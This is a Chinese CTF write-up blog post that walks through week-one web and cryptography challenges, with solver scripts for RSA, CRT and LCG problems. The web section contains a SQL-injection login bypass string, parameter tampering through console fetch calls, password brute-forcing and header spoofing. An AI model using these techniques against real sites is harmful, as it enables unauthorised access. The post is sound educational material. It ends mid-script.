---
title: "newstart"
date: 2025-12-10 08:51:35
categories: "比赛wp"
tags:
  - "比赛wp"
cover: /img/backgrounds/bg-17.png
top_img: /img/backgrounds/bg-17.png
disableNunjucks: true
---

# week1
## web
### multi-headach3
robots协议

![](/assets/docs/比赛wp/newstart/img-001.png)

访问hidden.php发现会进行重定向，抓包

![](/assets/docs/比赛wp/newstart/img-002.png)

flag{f48750e4-f633-4fb5-89a5-8b310895f5c4}



### strange_login
万能密码注入<font style="color:rgb(126, 11, 11);">' </font><font style="color:rgb(27, 106, 199);">OR </font><font style="color:rgb(126, 11, 11);">'1'</font><font style="color:rgb(0, 0, 0);">=</font><font style="color:rgb(126, 11, 11);">'1</font>

![](/assets/docs/比赛wp/newstart/img-003.png)



### 宇宙的中心是php
view-source:查看源码

![](/assets/docs/比赛wp/newstart/img-004.png)

![](/assets/docs/比赛wp/newstart/img-005.png)

八进制绕过

关键点在于intval函数的使用。intval函数将变量转换为整数。它有两个参数：第一个是要转换的值，第二个是基数（进制）。如果基数为0，intval会根据字符串的前缀自动判断进制：如果以"0x"开头，就是十六进制；以"0"开头，就是八进制；否则是十进制。

所以，条件要求：

intval($answer) != 47：当以十进制转换时，值不等于47。

intval($answer, 0) == 47：当自动判断进制时，值等于47。

这意味着我需要找到一个值，当直接以十进制转换时不是47，但当自动判断进制时是47。

例如，如果$answer是一个八进制数，比如"057"，那么：

intval("057") 会将其转换为十进制整数。由于没有指定基数，默认是十进制，但"057"以0开头，在十进制中会被视为57？不，实际上intval的默认行为是十进制，但字符串以0开头时，它不会自动解释为八进制，除非基数设置为0。intval($var) 只使用十进制转换，它会忽略字符串中的非数字字符，但如果字符串以数字开头，它会提取数字部分。对于字符串"057"，intval("057")会返回57，因为它读取数字057，但057在十进制中是57。

但当我们使用intval($var, 0)时，基数0表示自动检测进制。所以对于字符串"057"，由于以0开头，它会被解释为八进制，八进制的057等于十进制的47

所以，如果$answer是"057"，那么：

intval("057") 返回57（因为十进制转换），所以57 != 47，满足第一个条件。

intval("057", 0) 返回47（因为八进制转换），满足第二个条件。

![](/assets/docs/比赛wp/newstart/img-006.png)

### 别笑，你也过不了第二关
查看源码，每关需要<font style="color:rgb(0, 0, 0);">1000000分</font>

![](/assets/docs/比赛wp/newstart/img-007.png)

全部通关后会发送一个post请求

![](/assets/docs/比赛wp/newstart/img-008.png)

直接发送访问回显no

![](/assets/docs/比赛wp/newstart/img-009.png)

构造分数

![](/assets/docs/比赛wp/newstart/img-010.png)

### 我真得控制你了
查看源码

![](/assets/docs/比赛wp/newstart/img-011.png)

在控制台直接提交表单

document.getElementById('nextLevelForm').submit();

![](/assets/docs/比赛wp/newstart/img-012.png)

bp爆破，密码是111111

![](/assets/docs/比赛wp/newstart/img-013.png)

![](/assets/docs/比赛wp/newstart/img-014.png)

异或两次即可

![](/assets/docs/比赛wp/newstart/img-015.png)



### 黑客小W的故事（1）
查看源码

```bash
HTTP/2 200 OK
Date: Mon, 29 Sep 2025 02:53:35 GMT
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding

<!DOCTYPE html>
<html lang="zh-cn">
<head>
    <meta charset="UTF-8">
    <title>打猎时间到</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            padding: 0;
        }
        .center-img-container {
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f8fafc;
        }
        .center-img {
            max-width: 60vw;
            max-height: 60vh;
            cursor: pointer;
            box-shadow: 0 4px 24px rgba(52,152,219,0.10);
            border-radius: 12px;
            transition: box-shadow 0.2s;
        }
        .center-img:active {
            box-shadow: 0 2px 8px rgba(52,152,219,0.18);
        }
    </style>
</head>
<body>
    <div class="center-img-container" id="center-img-container">
    <div style="display: flex; flex-direction: column; align-items: center; width: 100%;" id="center-img-content">
        <img src="/static/img/Hopper.png" alt="点击图片" class="center-img" id="center-img">
        <div id="geo-count" style="
            margin-top: 18px; 
            font-size: 18px; 
            color: #217dbb; 
            font-weight: 500; 
            text-align: center; 
            width: 100%;
        ">
            当前的吉欧数量<span id="geo-count-value">16</span>
        </div> 
        <div id="feedback" style="position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); color: red;"></div>
    </div>
</div>
    
    <!-- 点击获得提示 -->
    <button id="hint-btn" style="
        position: fixed;
        right: 32px;
        bottom: 32px;
        background: #3498db;
        color: #fff;
        border: none;
        border-radius: 24px;
        padding: 10px 26px;
        font-size: 16px;
        font-weight: 500;
        box-shadow: 0 2px 12px rgba(52,152,219,0.12);
        cursor: pointer;
        z-index: 3000;
        transition: background 0.2s;
    ">提示</button>
    
    <script>
        document.getElementById('center-img').onclick = function() {
            fetch('/hunt', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Cookie': document.cookie
                },
                body: JSON.stringify({ "count": 1})
            })
            .then(res => res.json())
            .then(data => {
                if (document.getElementById('Gushen-img')) {
                  const imgElement = document.getElementById('center-img-content');
                  const gushenImg = document.getElementById('Gushen-img');
                  imgElement.removeChild(gushenImg);
                }
                // 可根据返回内容做反馈
                if (data.NextLevel !== undefined) {
                  const NewHref = data.NextLevel;
                  const feedbackDiv = document.getElementById('feedback');
                  feedbackDiv.style.color = 'green';
                  feedbackDiv.innerText = '哦豁，吉欧够了，那我就把剑技教给你吧';
                  setTimeout(() => {
                      window.location.href = NewHref;
                  }, 1500);
                } else if (data.GeoCount !== undefined) {
                  const geoCountValue = document.getElementById('geo-count-value');
                  geoCountValue.innerText = data.GeoCount;
                  const feedbackDiv = document.getElementById('feedback');
                  feedbackDiv.style.color = 'yellowgreen';
                  feedbackDiv.innerText = data.message;
                } else if (data.Gushen !== undefined) {
                  const imgElement = document.getElementById('center-img-content');
                  const geoCountValue = document.getElementById('geo-count-value');
                  const feedbackDiv = document.getElementById('feedback');
                  const NewImage = document.createElement('img');
                  NewImage.src = '/static/img/aspid.png';
                  NewImage.alt = '古神';
                  NewImage.className = 'center-img';
                  NewImage.id = 'Gushen-img';
                  imgElement.appendChild(NewImage);
                  geoCountValue.innerText = 0;
                  feedbackDiv.style.color = 'red';
                  feedbackDiv.innerText = '你被古神干掉了！吉欧都没了！';
                } else {
                  console.log("发生错误");
                  const feedbackDiv = document.getElementById('feedback');
                  feedbackDiv.style.color = 'red';
                  feedbackDiv.innerText = '嘿，你在搞什么呢？';
                }
            })
            .catch(() => {
                const feedbackDiv = document.getElementById('feedback');
                feedbackDiv.style.color = 'red';
                feedbackDiv.innerText = '网络错误，请稍后再试';
            });
        };
        // 创建下一关的跳转
        
        document.getElementById('hint-btn').onclick = function() {
            window.location.href = '/hint_OroHelpsYou';
        };
    </script>
</body>
</html>
```

在控制台发送以下代码，直接调用fetch，把数量改为100000



```bash
fetch('/hunt', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Cookie': document.cookie
    },
    body: JSON.stringify({ "count": 100000 })
})
.then(res => res.json())
.then(data => {
    console.log('服务器响应:', data);
    
    // 更新吉欧数量显示
    if (data.GeoCount !== undefined) {
        document.getElementById('geo-count-value').textContent = data.GeoCount;
    }
    
    // 检查是否进入下一关
    if (data.NextLevel !== undefined) {
        console.log('可以进入下一关:', data.NextLevel);
        window.location.href = data.NextLevel;
    }
})
.catch(error => {
    console.error('请求失败:', error);
});
```

![](/assets/docs/比赛wp/newstart/img-016.png)

![](/assets/docs/比赛wp/newstart/img-017.png)





SHI

![](/assets/docs/比赛wp/newstart/img-018.png)

![](/assets/docs/比赛wp/newstart/img-019.png)







![](/assets/docs/比赛wp/newstart/img-020.png)

![](/assets/docs/比赛wp/newstart/img-021.png)

![](/assets/docs/比赛wp/newstart/img-022.png)



![](/assets/docs/比赛wp/newstart/img-023.png)

构造：CycloneSlash/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) DashSlash/140.0.0.0 Safari/537.36

![](/assets/docs/比赛wp/newstart/img-024.png)

![](/assets/docs/比赛wp/newstart/img-025.png)

## 密码
### 唯一表示
解密过程

恢复整数消息： 我们的目标是恢复原始整数 message_int。为此，我们需要用中国剩余定理 (CRT) 对余数和相应的素数进行计算，最终重建出消息的整数值。



逆向执行 fun： fun 函数的作用是根据给定整数 n 来生成一系列的余数，直到这些余数和模数通过 CRT 恢复出原始整数 n。我们需要反向利用这个过程来恢复消息。

```bash
from sympy.ntheory.modular import crt
from Crypto.Util.number import long_to_bytes
from sympy import primerange

# 生成素数列表
primes = list(primerange(2, 114514))

# 余数序列（从加密中得到的 c）
c = [1, 2, 2, 4, 0, 2, 11, 11, 8, 23, 1, 30, 35, 0, 18, 30, 55, 60, 29, 42, 8, 13, 49, 11, 69, 26, 8, 73, 84, 67, 100, 9, 77, 72, 127, 49, 57, 74, 70, 129, 146, 45, 35, 180, 196, 101, 100, 146, 100, 194, 2, 161, 35, 155]

# 使用 c 和 primes 通过中国剩余定理恢复原始整数值
reconstructed_message_int, _ = crt(primes[:len(c)], c)

# 将恢复的整数值转换为字节串，得到原始的 flag
reconstructed_message = long_to_bytes(reconstructed_message_int).decode()

print(reconstructed_message)

```

### 小跳蛙
<font style="color:rgb(97, 102, 107);">考察欧几里得算法，用于计算最大公约数（GCD）。最终位置应该是 (gcd(a,b), gcd(a,b))，因为每次跳跃都在减少数值，直到两者相等，而相等时就是 GCD。</font>

<font style="color:rgb(97, 102, 107);">因此第一跳：gcd(8,9) = 1，所以最终位置应该是 (1,1)，反复执行最后跳到flag</font>

![](/assets/docs/比赛wp/newstart/img-026.png)



### 初识RSA
md5解密key

![](/assets/docs/比赛wp/newstart/img-027.png)

<font style="color:rgb(97, 102, 107);">步骤：</font>

1. <font style="color:rgb(97, 102, 107);">计算key_int = bytes_to_long(b'crypto')</font>
2. <font style="color:rgb(97, 102, 107);">计算p = P ^ key_int</font>
3. <font style="color:rgb(97, 102, 107);">计算p3 = p^3</font>
4. <font style="color:rgb(97, 102, 107);">检查n % p3 == 0，然后计算q2 = n // p3，然后q是q2的平方根？因为q2应该是q的平方，所以我们可以取平方根。但需要检查q2是否是完全平方数。</font>
5. <font style="color:rgb(97, 102, 107);">计算φ(n) = p^2 * (p-1) * q * (q-1)</font>
6. <font style="color:rgb(97, 102, 107);">计算d = pow(e, -1, φ(n))</font>
7. <font style="color:rgb(97, 102, 107);">计算m = pow(c, d, n)</font>
8. <font style="color:rgb(97, 102, 107);">将m转换为字节</font>

```bash
from Crypto.Util.number import *
import math

# 给定数据
P = 8950704257708450266553505566662195919814660677796969745141332884563215887576312397012443714881729945084204600427983533462340628158820681332200645787691506
n = 44446616188218819786207128669544260200786245231084315865332960254466674511396013452706960167237712984131574242297631824608996400521594802041774252109118569706894250996931000927100268277762882754652796291883967540656284636140320080424646971672065901724016868601110447608443973020392152580956168514740954659431174557221037876268055284535861917524270777789465109449562493757855709667594266126482042307573551713967456278514060120085808631486752297737122542989222157016105822237703651230721732928806660755347805734140734412060262304703945060273095463889784812104712104670060859740991896998661852639384506489736605859678660859641869193937584995837021541846286340552602342167842171089327681673432201518271389316638905030292484631032669474635442148203414558029464840768382970333
c = 42481263623445394280231262620086584153533063717448365833463226221868120488285951050193025217363839722803025158955005926008972866584222969940058732766011030882489151801438753030989861560817833544742490630377584951708209970467576914455924941590147893518967800282895563353672016111485919944929116082425633214088603366618022110688943219824625736102047862782981661923567377952054731667935736545461204871636455479900964960932386422126739648242748169170002728992333044486415920542098358305720024908051943748019208098026882781236570466259348897847759538822450491169806820787193008018522291685488876743242619977085369161240842263956004215038707275256809199564441801377497312252051117441861760886176100719291068180295195677144938101948329274751595514805340601788344134469750781845
e = 65537

# 计算key的整数表示
key = b'crypto'
key_int = bytes_to_long(key)

# 通过异或恢复p
p = P ^ key_int

# 验证p是素数（可选，但确保正确性）
if not isPrime(p):
    print("Warning: p might not be prime")

# 计算p^3
p3 = p**3

# 检查n是否被p^3整除
if n % p3 != 0:
    print("Error: n is not divisible by p^3")
    exit(1)

# 计算q^2
q2 = n // p3

# 由于q是素数，q^2应该是一个完全平方数，我们取平方根得到q
q = math.isqrt(q2)
if q * q != q2:
    print("Error: q2 is not a perfect square")
    exit(1)

# 验证q是素数
if not isPrime(q):
    print("Warning: q might not be prime")

# 计算欧拉函数φ(n)
phi = (p**2) * (p - 1) * q * (q - 1)

# 计算私钥d
d = pow(e, -1, phi)

# 解密得到m
m = pow(c, d, n)

# 将m转换为字节
flag = long_to_bytes(m)

print(flag.decode())
```



### 随机数之旅1
<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">解密思路</font>

<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">由递推公式可得：</font>

<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">1</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">]</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">=</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">(</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">a</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">⋅</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">0</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">]</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">+</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">m</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">)</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">mod</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">p</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">2</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">]</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">=</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">(</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">a</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">⋅</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">1</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">]</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">+</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">m</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">)</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">mod</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">p</font>_

<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">两式相减消去</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);"> </font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">m</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">：</font>

<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">2</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">]</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">−</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">1</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">]</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">=</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">a</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">⋅</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">(</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">1</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">]</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">−</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">0</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">])</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);"> </font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">(</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">mod</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);"> </font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">p</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">)</font>

<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">于是：</font>

_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">a</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">=</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">(</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">2</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">]</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">−</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">1</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">])</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">⋅</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">(</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">1</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">]</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">−</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">hint</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">[</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">0</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">]</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">)</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">−</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">1</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);"> </font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">(</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">mod</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);"> </font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">p</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">)</font>

---

<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">得到</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);"> </font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">a</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);"> </font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">之后，代入任意一个式子求</font><font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);"> </font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">m</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">：</font>

_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">m</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">=(hint[1]−</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">a</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">⋅hint[0])mod</font>_<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">p</font>_

```bash
from Crypto.Util.number import long_to_bytes

# 已知数据
a = 295789025762601408173828135835543120874436321839537374211067344874253837225114998888279895650663245853
p = 516429062949786265253932153679325182722096129240841519231893318711291039781759818315309383807387756431
hint = [
    184903644789477348923205958932800932778350668414212847594553173870661019334816268921010695722276438808,
    289189387531555679675902459817169546843094450548753333994152067745494929208355954578346190342131249104,
    511308006207171169525638257022520734897714346965062712839542056097960669854911764257355038593653419751,
    166071289874864336172698289575695453201748407996626084705840173384834203981438122602851131719180238215,
    147110858646297801442262599376129381380715215676113653296571296956264538908861108990498641428275853815,
    414834276462759739846090124494902935141631458647045274550722758670850152829207904420646985446140292244
]

# 取前三项计算 a 和 m
h0, h1, h2 = hint[0], hint[1], hint[2]

# 计算 a（虽然题目已经给出 a，但我们可以验证）
if (h1 - h0) % p == 0:
    # 特殊情况，递推常数
    a_calc = 0
else:
    a_calc = (h2 - h1) * pow(h1 - h0, -1, p) % p

print(f"计算得到的 a = {a_calc}")
print(f"题目给出的 a = {a}")

# 计算 m
m = (h1 - a * h0) % p
print(f"m = {m}")

# 转换为 flag
flag = long_to_bytes(m)
print(f"flag = {flag.decode()}")
```

### Sagemath使用指哪？
1. <font style="color:rgb(0, 0, 0);">重新计算出相同的 key</font>
2. <font style="color:rgb(0, 0, 0);">对密文 c 进行相同的 XOR 操作（因为 XOR 是自反的）</font>
3. <font style="color:rgb(0, 0, 0);">将结果转换回字符串</font>

打开sagemath运行

```bash
# 重新计算 key
key = 1
G = PSL(2, 11)
key *= G.order()
G = CyclicPermutationGroup(11)
key *= G.order()
G = AlternatingGroup(114)
key *= G.order()
G = PSL(4, 7)
key *= G.order()
G = PSU(3, 4)
key *= G.order()
G = MathieuGroup(12)
key *= G.order()

# 原始密文
c = 91550542840025722520458836108112308924742424464072171170891749838108012046397534151231852770095499011

# 处理 key（与加密过程相同）
key = int(str(bin(key))[2:][0:42*8], 2)

# 解密（XOR 是自反的）
m = c ^^ key

# 将解密结果转换为字符串
f = []
while m > 0:
    x = m % 256
    f.append(chr(x))
    m //= 256
f.reverse()
flag = "".join(f)

print(flag)
```

## 挑战
### [Cry]随机数之旅1.3
<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">解密思路</font>

1. <font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">利用线性同余序列的性质，通过前三个元素建立方程求解</font>`<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">a</font>`
2. <font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">代入</font>`<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">a</font>`<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">求解</font>`<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">m</font>`
3. <font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">将</font>`<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">m</font>`<font style="color:rgb(0, 0, 0);background-color:rgb(249, 250, 251);">转换回字节流得到 flag</font>

```bash
from Crypto.Util.number import long_to_bytes

# 已知的p和hint数组
p = 478475545597700801137542329947268027178596565166277501475984783168264336204134464479893480035711325623
hint = [
    249919247565764496968024420668100990050724930264873012553221627994767139138419916559737152956192938786,
    341098538517870638403021803297435486563954299904421591195678329627022088404800269966659959073623486227,
    20018219100052262465673657639106096626775270934552714906385093540517665089433306304783945869390965352,
    477110987927537932362183022083084081803652185884243696031637228688890267574215943741789667631285188517,
    316109317526042308856009312339591028959770431193022541894694590723163440242617594274841279773268292931,
    288838512929949193288464156452590499193348618769922838206940876596503314942400180385295933551444987426,
    181266945000896484248052902194760405660042158622313374086868842724033187572461235292532472052806294610,
    363891817161955280083221864938995130581363107122643810787521989924285652140760869565757181912307151144,
    176158258425616548246181359314308658522975855113878838400631572536985398273419876407488652665740506588,
    226304243444318985869957901105733987782986057182483943969163921743774283862329285859875298207849486395,
    235563126973016483026307105002236457145848856279569924823679216801904771557144382780782533443602319128
]

# 取前三个元素计算
h0 = hint[0]
h1 = hint[1]
h2 = hint[2]

# 计算差值
delta1 = (h1 - h0) % p
delta2 = (h2 - h1) % p

# 计算delta1的模p逆元（费马小定理）
inv_delta1 = pow(delta1, p-2, p)

# 求解a
a = (delta2 * inv_delta1) % p

# 求解m
m = (h1 - a * h0) % p

# 将m转换为flag
flag = long_to_bytes(m).decode()
print(flag)
```



### [Cry]随机数之旅1.9
1. **<font style="color:rgb(15, 17, 21);">恢复素数</font>****<font style="color:rgb(15, 17, 21);"> </font>**`**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">p</font>**`<font style="color:rgb(15, 17, 21);">：由于</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">p</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">未直接给出，我们可以利用序列的线性递归性质。计算差值</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">d_i = hint[i+1] - hint[i]</font>`<font style="color:rgb(15, 17, 21);">，然后计算</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">k_i = d_i * d_{i-2} - d_{i-1}^2</font>`<font style="color:rgb(15, 17, 21);">。这些</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">k_i</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">都是</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">p</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">的倍数，因此计算所有</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">k_i</font>`<font style="color:rgb(15, 17, 21);"> </font><font style="color:rgb(15, 17, 21);">的最大公约数（GCD）即可得到</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">p</font>`<font style="color:rgb(15, 17, 21);">。</font>
2. **<font style="color:rgb(15, 17, 21);">恢复参数</font>****<font style="color:rgb(15, 17, 21);"> </font>**`**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">a</font>**`<font style="color:rgb(15, 17, 21);">：利用差值序列的关系</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">d_i = a * d_{i-1} mod p</font>`<font style="color:rgb(15, 17, 21);">，计算</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">a = d_i * d_{i-1}^{-1} mod p</font>`<font style="color:rgb(15, 17, 21);">。</font>
3. **<font style="color:rgb(15, 17, 21);">恢复消息</font>****<font style="color:rgb(15, 17, 21);"> </font>**`**<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">m</font>**`<font style="color:rgb(15, 17, 21);">：使用第一个方程</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">hint[1] = a * hint[0] + m mod p</font>`<font style="color:rgb(15, 17, 21);">，计算</font><font style="color:rgb(15, 17, 21);"> </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">m = hint[1] - a * hint[0] mod p</font>`<font style="color:rgb(15, 17, 21);">。</font>
4. **<font style="color:rgb(15, 17, 21);">解密flag</font>**<font style="color:rgb(15, 17, 21);">：将 </font>`<font style="color:rgb(15, 17, 21);background-color:rgb(235, 238, 242);">m</font>`<font style="color:rgb(15, 17, 21);"> 转换为字节串即可得到flag。</font>

```bash
import math
from Crypto.Util.number import long_to_bytes

